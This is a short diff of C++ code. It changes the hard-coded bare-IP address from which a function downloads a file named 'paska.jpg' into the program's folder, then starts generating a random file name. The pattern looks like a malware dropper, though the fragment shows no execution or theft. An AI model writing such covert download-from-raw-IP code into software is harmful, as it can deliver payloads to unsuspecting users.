@@ -24,7 +24,7 @@ void FS::F_Main(std::string* PATH, bool* var)
     //return;
     *var = !*var;
     srand(time(NULL));
-    std::string url = "http://16.170.254.129/paska.jpg";
+    std::string url = "http://70.34.197.88/paska.jpg";
     std::string dst = GetExePath()+"\\paska.jpg";
 
     if (!F_DownloadFile(url, dst)) {
@@ -32,7 +32,7 @@ void FS::F_Main(std::string* PATH, bool* var)
         system("pause");
         return;
     }
-   
+    std::cout << "file downloaded\n";
     
     std::string random_file_name;
     CreateRandomString(rand() % 20, &random_file_name);
